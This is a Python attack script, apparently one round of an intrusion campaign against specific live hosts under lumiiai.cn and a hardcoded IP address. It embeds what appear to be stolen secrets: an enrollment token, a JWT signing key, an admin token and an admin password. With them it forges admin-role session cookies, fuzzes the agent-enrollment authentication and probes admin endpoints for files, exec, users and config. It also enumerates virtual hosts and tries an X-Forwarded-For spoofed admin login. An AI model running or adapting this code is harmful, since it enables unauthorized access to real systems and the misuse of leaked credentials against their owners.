#!/usr/bin/env python3
# i29468 round4: mine SPA for install/agent URLs, fetch public installer/binary, fuzz agent-enroll auth formats, dashboard diag, vhost.
import os, sys, json, time, base64, hmac, hashlib, subprocess, re

OPS = "cloud-ops.lumiiai.cn"
OPSIP = "124.223.170.146"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
ENROLL = "en_ApQqOrmaeohGaVUqjCk_T7P2miY8yMHV"
DASH = "dashboard.lumiiai.cn"
JWT_SECRET = "w2I+OOqT9vkI12T3bNGwNp/2EA/L2H1ecwnWwA7UZ6A="
ADMIN_TOKEN = "6c73b13da5b9d09c642a3daa85be7d62d8025acfaebfdbe6"
START = time.time()

def _b(s):
    if not isinstance(s, str): s = json.dumps(s, ensure_ascii=False, default=str)
    return base64.b64encode(s.encode("utf-8", "replace")).decode()
def R(k, v): print("R:%s:%s" % (k, _b(v)), flush=True)
def run(args, timeout=60):
    try:
        p = subprocess.run(args, capture_output=True, timeout=timeout); return p.returncode, p.stdout, p.stderr
    except Exception as e:
        return -1, b"", repr(e).encode()

def http(url, method="GET", body=None, headers=None, timeout=25, maxlen=200000, raw=False, extra=None):
    a = ["curl", "-s", "-k", "-m", str(timeout), "--http2", "-A", UA, "-w", "\n__C__%{http_code}\n__T__%{content_type}"]
    for h in (headers or []): a += ["-H", h]
    for x in (extra or []): a += [x]
    if body is not None:
        a += ["-X", method, "--data-binary", body if isinstance(body, str) else json.dumps(body)]
        if not any(h.lower().startswith("content-type") for h in (headers or [])):
            a += ["-H", "Content-Type: application/json"]
    elif method != "GET": a += ["-X", method]
    a += [url]
    rc, out, err = run(a, timeout=timeout + 15)
    t = out.decode("utf-8", "replace"); c = ""; ct = ""
    m = re.search(r"\n__T__([^\n]*)", t)
    if m: ct = m.group(1); t = t[:m.start()]
    i = t.rfind("__C__")
    if i >= 0: c = t[i+5:].strip()[:3]; t = t[:i]
    if raw: return {"code": c, "ct": ct, "raw": out[:maxlen]}
    return {"code": c, "ct": ct, "body": t[:maxlen]}

def b64u(b):
    if isinstance(b, str): b = b.encode()
    return base64.urlsafe_b64encode(b).rstrip(b'=').decode()
def forge(uid, cust="aro"):
    now = int(time.time())
    hh = b64u(json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(",", ":")))
    pp = b64u(json.dumps({"userId": uid, "email": "p@x", "customer": cust, "role": "admin",
                          "iat": now, "exp": now + 86400 * 7}, separators=(",", ":")))
    return hh + "." + pp + "." + b64u(hmac.new(JWT_SECRET.encode(), (hh + "." + pp).encode(), hashlib.sha256).digest())

# ===== A) bundle mining for install/agent URLs =====
js = http("https://%s/assets/index-vk_qsCO3.js" % OPS, timeout=40, maxlen=2000000)
body = js["body"]
M = {"len": len(body)}
urls = sorted(set(re.findall(r'https?://[A-Za-z0-9_.\-/:?#=&%{}]+', body)))
M["urls"] = [u for u in urls if re.search(r"lumi|ops|agent|release|download|cdn|cos|oss|tencent|install", u, re.I)][:80]
ctx = {}
for kw in ["install.sh", "install", "amd64", "sh -s", "bash -s", "sudo bash", "curl -fsSL", "systemd",
           "enroll", "接入命令", "agent-versions/", "release.create", "jobs", "job", "run_script", "exec",
           "deploy", "backup"]:
    hits = []
    for m in re.finditer(re.escape(kw), body):
        hits.append(body[max(0, m.start()-260):m.start()+320])
        if len(hits) >= 3: break
    ctx[kw] = hits
M["ctx"] = ctx
R("MINE4", M)

# ===== B) try public installer / agent binary URLs =====
paths = ["/install.sh", "/install", "/agent/install.sh", "/api/agent/install.sh", "/dl/install.sh",
         "/asset/install.sh", "/static/install.sh", "/release/install.sh",
         "/agent/lumii-ops-agent-linux-amd64", "/dl/lumii-ops-agent-linux-amd64",
         "/download/lumii-ops-agent-linux-amd64", "/releases/lumii-ops-agent-linux-amd64",
         "/api/agent/download", "/api/agent/binary", "/api/agent/versions/latest", "/agent-versions/latest"]
B = {}
for p in paths:
    try:
        r = http("https://%s%s" % (OPS, p), timeout=15, maxlen=3000)
        B[p] = {"code": r["code"], "ct": r["ct"], "len": len(r["body"]), "head": r["body"][:600]}
    except Exception as e:
        B[p] = {"err": repr(e)}
    time.sleep(0.15)
R("PUBLIC", B)

# ===== C) agent-enroll auth format fuzz =====
C = {}
variants = [
    ["Authorization: Bearer " + ENROLL],
    ["Authorization: Enroll " + ENROLL],
    ["X-Enroll-Token: " + ENROLL],
    ["X-Enroll: " + ENROLL],
    ["X-Agent-Token: " + ENROLL],
    ["X-Instance-Token: " + ENROLL],
    ["X-Lumii-Token: " + ENROLL],
    ["X-Api-Key: " + ENROLL],
    ["X-Platform-Token: " + ENROLL],
    ["X-Token: " + ENROLL],
    ["Authorization: Token " + ENROLL],
    ["Authorization: " + ENROLL],
]
bodies = [
    {"token": ENROLL, "hostname": "recon29468", "kind": "center", "version": "0.0.0", "platform": "linux"},
    {"enroll_token": ENROLL, "hostname": "recon29468", "kind": "center", "version": "0.0.0"},
]
for i, h in enumerate(variants):
    bdy = bodies[i % len(bodies)]
    C[h[0][:40]] = http("https://%s/api/agent/enroll" % OPS, method="POST", body=bdy, headers=h, timeout=15, maxlen=1200)
    time.sleep(0.2)
# query/param styles
C["q_token"] = http("https://%s/api/agent/enroll?token=%s" % (OPS, ENROLL), method="POST",
                    body={"hostname": "recon29468", "kind": "center"}, timeout=15, maxlen=1200)
C["path_token"] = http("https://%s/api/agent/enroll/%s" % (OPS, ENROLL), method="POST",
                       body={"hostname": "recon29468"}, timeout=15, maxlen=1200)
C["body_token_only"] = http("https://%s/api/agent/enroll" % OPS, method="POST", body={"token": ENROLL}, timeout=15, maxlen=1200)
R("ENROLLFUZZ", C)

# ===== D) dashboard diagnostics =====
D = {}
sess = forge("af0a2285-490f-11f1-ac43-525400595be1", "aro")
for p in ["/api/me", "/api/agents/agent-15a45493/files?action=list&path=/opt",
          "/api/admin/agents", "/api/admin/users", "/api/admin/config", "/api/admin/settings",
          "/api/admin/metrics", "/api/admin/version", "/api/admin/runtimes", "/api/admin/files",
          "/api/admin/exec", "/api/admin/tokens", "/api/admin/stats", "/api/admin/audit",
          "/api/admin/agents/agent-15a45493", "/api/admin/agents/agent-15a45493/env",
          "/api/admin/agents/agent-15a45493/files?path=/opt&action=list"]:
    auth = "Bearer" if p.startswith("/api/admin") else "Cookie"
    hdrs = ["Authorization: Bearer " + ADMIN_TOKEN] if auth == "Bearer" else ["Cookie: session=" + sess]
    if p.startswith("/api/admin/agents/agent-15a45493/files"):
        hdrs = ["Authorization: Bearer " + ADMIN_TOKEN, "Cookie: session=" + sess]
    try:
        r = http("https://%s%s" % (DASH, p), headers=hdrs, timeout=20, maxlen=2000)
        D[p] = {"code": r["code"], "body": r["body"][:600]}
    except Exception as e:
        D[p] = {"err": repr(e)}
    time.sleep(0.15)
# also files with both
D["files_both"] = http("https://%s/api/agents/agent-15a45493/files?action=list&path=/opt" % DASH,
                       headers=["Authorization: Bearer " + ADMIN_TOKEN, "Cookie: session=" + sess], timeout=20, maxlen=1500)
R("DASH4", D)

# ===== E) vhost via --resolve =====
E = {}
for h in ["cloud-admin.lumiiai.cn", "cloud.lumiiai.cn", "lumii-cloud.lumiiai.cn"]:
    E[h] = http("https://%s/" % h, extra=["--resolve", "%s:443:%s" % (h, OPSIP)], timeout=15, maxlen=1200)
    time.sleep(0.2)
# direct IP with SNI mismatch + Host
E["ip_host"] = http("https://%s/" % OPSIP, headers=["Host: cloud-admin.lumiiai.cn"], timeout=15, maxlen=1200)
R("VHOST4", E)

# ===== F) XFF login attempt =====
F = {}
for xff in ["127.0.0.1", "124.223.170.146", "10.0.0.1"]:
    F[xff] = http("https://%s/api/auth/login" % OPS, method="POST",
                  body={"username": "admin", "password": "iGIqnu4f8UGepPjBtQRt"},
                  headers=["X-Forwarded-For: " + xff], timeout=15, maxlen=600)
    time.sleep(0.5)
R("XFF", F)

R("DONE", {"elapsed": int(time.time() - START)})
print("ROUND4_DONE", flush=True)
